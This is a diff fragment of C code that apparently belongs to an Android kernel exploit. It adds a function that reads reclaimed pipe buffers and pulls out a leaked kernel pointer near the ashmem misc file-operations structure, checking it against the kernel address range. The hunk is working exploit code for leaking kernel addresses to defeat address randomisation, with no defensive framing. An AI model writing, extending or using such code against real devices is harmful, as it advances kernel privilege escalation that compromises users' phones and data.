@@ -1095,6 +1095,37 @@ uintptr_t scan_p0_pipe_oracle(void) {
   return best_slide;
 }
 
+uint64_t scan_p0_virtual_base_pointer(void) {
+  unsigned char page[PAGE_SIZE];
+  size_t pointer_offset = data_addr(ASHMEM_MISC_FOPS) & (PAGE_SIZE - 1);
+  size_t read_size = pointer_offset + sizeof(uint64_t);
+  uint64_t pointer = 0;
+  int changed_pages = 0;
+
+  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
+    memset(page, 0, sizeof(page));
+    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page, read_size)) {
+      pr_warning("p0 virtual probe partial read failed pipe=%zu size=%zu "
+                 "errno=%d\n", pipe_index, read_size, errno);
+      return 0;
+    }
+    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
+      continue;
+    }
+    changed_pages++;
+    memcpy(&pointer, page + pointer_offset, sizeof(pointer));
+    pr_info("p0 virtual probe pipe=%zu offset=%zu pointer=%016llx\n",
+            pipe_index, pointer_offset, (unsigned long long)pointer);
+  }
+
+  pr_info("p0 virtual probe changed=%d pointer=%016llx\n",
+          changed_pages, (unsigned long long)pointer);
+  if (changed_pages != 1 || (pointer >> 48) != 0xffff) {
+    return 0;
+  }
+  return pointer;
+}
+
 int restore_p0_oracle_pages(int fd) {
   if (!p0_gate_page_struct && !p0_probe_page_struct) {
     return 1;
